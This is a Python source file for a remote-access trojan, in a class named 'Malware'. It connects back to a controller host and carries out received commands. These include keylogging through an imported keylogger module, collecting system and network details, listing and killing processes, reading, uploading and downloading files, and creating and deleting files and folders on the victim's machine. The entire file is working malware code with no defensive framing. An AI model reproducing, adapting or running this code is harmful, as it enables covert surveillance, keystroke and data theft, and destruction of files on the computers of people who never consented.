import socket as st
import os
import shutil
import platform
import psutil
import stat
import sys
from keylogging import *
from keylogging import keylogger
# from colorama import Fore, Style


class Malware:
    def __init__(self,host,port):
        self.HOST = host
        self.PORT = port
        self.sock = st.socket(st.AF_INET, st.SOCK_STREAM)

    def get_network_infos(self):
        ip = 'x-x-x-x-x-x-x-x'
        mac = 'x-x-x-x-x-x-x-x'
        netmask = 'x-x-x-x-x-x-x-x'
        broadcast = 'x-x-x-x-x-x-x-x'
        for interface, addrs in psutil.net_if_addrs().items():
            for getinfo in addrs:
                if getinfo.family == st.AF_INET:
                    ip = getinfo.address
                    netmask = getinfo.netmask
                    broadcast = getinfo.broadcast if getinfo.broadcast else 'x-x-x-x-x-x-x-x'
                if getinfo.family == psutil.AF_LINK:
                    mac = getinfo.address.replace('-',':')
                
            return f"""
        Interface name : {interface}
        IP address : {ip}
        MAC address : {mac}
        Net mask address : {netmask}
        Broadcast address : {broadcast} 
            """

    def get_system_information(self):
        if platform.system() == 'Windows':
            getBuildNumber = int(platform.version().split('.')[2])
            if getBuildNumber < 22000:
                os_name = 'Windows 10'
            elif getBuildNumber >= 22000:
                os_name = 'Windows 11'
            else:
                os_name = 'Windows'

        curr_ram = psutil.virtual_memory().total // pow(1024,3)
        return """
        {}\n
        Device name : {}
        System : {}
        OS version : {}
        Architecture : {}
        Machine : {}
        Processor : {}
        Core : {}
        Battery : {}%\n\n
        {}\n
        Disk Usage : {}
        Disk partitions : {}
        RAM : {}
        CPU usage : {}\n\n
        {}
        {}\n
        """.format(
            'SYSTEM INFORMATION'.center(150),
            os_name,
            platform.node(),
            platform.version(),
            platform.architecture()[0],
            platform.machine(),
            platform.processor(),
            os.cpu_count(),
            f'{psutil.sensors_battery().percentage}%' if psutil.sensors_battery() else 'The device dont have battery(Desktop)',
            'DISK INFORMATION'.center(150),
            psutil.disk_usage(os.getcwd()),
            psutil.disk_partitions(),
            curr_ram,
            psutil.cpu_percent(),
            'NETWORK INFORMATION'.center(150),
            self.get_network_infos()
        ).encode()

    def create_thing(get_cmd,sock):
        cmd = get_cmd.split()
        file_type = cmd[1]
        if file_type == 'file':
            if cmd[2] and cmd[3]:
                try:
                    file_name = str(cmd[2])
                    getposes = []

                    for pos,arg in enumerate(cmd):
                        if '"' in arg:
                            getposes.append(pos)

                    f_content = ''
                    for _content in range(getposes[0],getposes[1]+1):
                        f_content += cmd[_content] + ' '
                    
                    with open(file_name,'w') as wfile:
                        wfile.write(f_content.replace('"',''))
                        sock.send(f'The file \'{file_name}\' created and content written'.encode())
                    wfile.close()
                except Exception as err:
                    sock.send(str(err).encode())  
                    
            elif cmd[2] and not cmd[3]:
                try:
                    with open(cmd[2],'w') as wfile:
                        wfile.write('')
                        sock.send(f'The file \'{cmd[2]}\' created'.encode())
                    wfile.close()
                except Exception as err:
                    sock.send(str(err).encode())
            else:
                sock.send('Syntax : touch file <file_name>'.encode())   
        
        elif file_type == 'folder':
            if cmd[2]:
                try:
                    os.makedirs(cmd[2])
                    sock.send('the file \'{}\' created at target successfully'.format(cmd[2]).encode())
                except Exception as err:
                    sock.send(str(err).encode())
            else:
                sock.send('Syntax : touch folder <folder_name>'.encode())

        else:
            sock.send('''   
                Usage : 
                    touch file <file_name> - To create file in the target system.
                    touch folder <folder_name> - To create folder in the target system.
            '''.encode())

    def getActives(self,sock):
        for actives in psutil.process_iter(['pid','name']):
            sock.send(f'''
            ============================================
            {'Actives'.center(30)}
            ============================================\n
            Process name : {actives.name()}
            Process PID : {actives.pid}
            Process executable path : {actives.exe()}
            Process status : {actives.status()}
            Process starts time : {actives.create_time()}
            Process runs at : {actives.cwd()}
            Process owner(username) : {actives.username()}
            Is terminal process : {actives.terminal()}
            '''.encode())
    
    def kill_proc(self,proc):
        Is_run = self.chkActives(proc)
        if Is_run:
            for actives in psutil.process_iter():
                if actives.name() == Is_run:
                    actives.kill()
                    return f'{actives.name()} : killed'.encode()
                else:
                    return f'{actives.name()} : kill failed'.encode()
        else:
            return f'{proc} : Invalid process(stopped)'.encode()

    def chkActives(self,active_name):
        for actives in psutil.process_iter(['pid','name']):
            if active_name in actives.name():
                return active_name

    def run(self):
        self.sock.connect((self.HOST,self.PORT))

        while True:
            self.sock.send(os.getcwd().encode())
            get_cmd = self.sock.recv(1024).decode().strip()
            if not get_cmd:  
                print("Connection closed by server.")
                break 

            try:
                if get_cmd.startswith('cd'):  
                    _dir = get_cmd.split(maxsplit=1)[1]  
                    os.chdir(_dir)
                    self.sock.send(' '.encode())

                elif get_cmd == 'list actives':
                    self.getActives(self.sock)

                elif get_cmd.startswith('check'):
                    check_act = get_cmd.split()
                    if check_act[1]:
                        proc_name = check_act[1]
                        get_chck = self.chkActives(proc_name)
                        if get_chck:
                            self.sock.send(f'{get_chck} : Running'.encode())
                        else:
                            self.sock.send(f'{proc_name} : not run'.encode())
                    else:
                        self.sock.send('Usage: check <process>'.encode())

                elif get_cmd == 'clear':
                    continue

                elif get_cmd.startswith('kill'):
                    if get_cmd.split()[1]:
                        process = get_cmd.split()[1]
                        kill_res = self.kill_proc(process)
                        self.sock.send(kill_res)
                    else:
                        self.sock.send('Usage : kill <process>'.encode())

                elif get_cmd == 'log keys':
                    try:
                        keylogger(self.sock)
                    except Exception as err:
                        continue

                elif get_cmd == 'exit' or get_cmd == 'quite':
                    self.sock.close()
                    sys.exit()

                elif get_cmd.startswith('touch'):
                    self.create_thing(get_cmd,self.sock)

                elif get_cmd == 'sysinfo':
                    self.sock.send(self.get_system_information())

                elif get_cmd.startswith('which'):
                    get_exec = get_cmd.split()[1]
                    get_exec_loc = shutil.which(get_exec)
                    self.sock.send(get_exec_loc.encode())

                elif get_cmd.startswith('rm'):
                    file_name = get_cmd.split()[1]
                    if os.path.exists(file_name):
                        os.chmod(file_name,stat.S_IWRITE)
                        os.remove(file_name)
                        self.sock.send('The file \'{}\' removed successfully'.format(file_name).encode())
                    else:
                        self.sock.send('The file \'{}\' doesnt exist'.format(file_name).encode())

                elif get_cmd.startswith('rmdir'):
                    folder_name = get_cmd.split()[1]
                    if os.path.exists(folder_name):
                        os.chmod(folder_name,stat.S_IWRITE)
                        shutil.rmtree(folder_name)
                        self.sock.send('The folder \'{}\' removed successfully'.format(folder_name).encode())
                    else:
                        self.sock.send('The folder \'{}\' doesnt exist'.format(folder_name).encode())

                elif get_cmd == 'ls':
                    _dir = os.getcwd()
                    files = '\n'.join(os.listdir(_dir))
                    self.sock.sendall(files.encode() + b'\n')
                
                elif get_cmd.startswith('cat'):  
                    file_path = get_cmd.split()[1]
                    if os.path.exists(file_path) and os.path.isfile(file_path):
                        with open(file_path, "r") as f:
                            self.sock.sendall(f.read().encode())
                    else:
                        self.sock.send(b"Error: File not found\n")

                elif get_cmd.startswith('download'):  
                    try:
                        dfile = '{}/{}'.format(os.getcwd(),get_cmd.split()[1])
                        if os.path.isfile(dfile):
                            with open(dfile,'rb') as file:
                                self.sock.sendfile(file)
                            self.sock.shutdown(st.SHUT_WR)
                            file.close()
                        else:
                            self.sock.send('{} is not a file'.format(dfile).encode())
                    except Exception as e:
                        self.sock.send(str(e).encode())

                elif get_cmd.startswith('push'):
                    split_cmd = get_cmd.split()
                    file_name = split_cmd[1]
                    try:
                        file_content = self.sock.recv(4096).decode()
                        file = open(file_name,'w')
                        file.write(file_content)
                        file.close()
                    except Exception as err:
                        self.sock.send(str(err).encode())

                elif get_cmd == 'pwd' or get_cmd == 'cwd':  
                    self.sock.send(os.getcwd().encode() + b"\n")

                else:
                    self.sock.send('Invalid command found : {}'.format(get_cmd).encode())

            except Exception as err:
                self.sock.send(str(err).encode())
                continue
            
            except ConnectionResetError:
                self.sock.close()
                break

        self.sock.close()

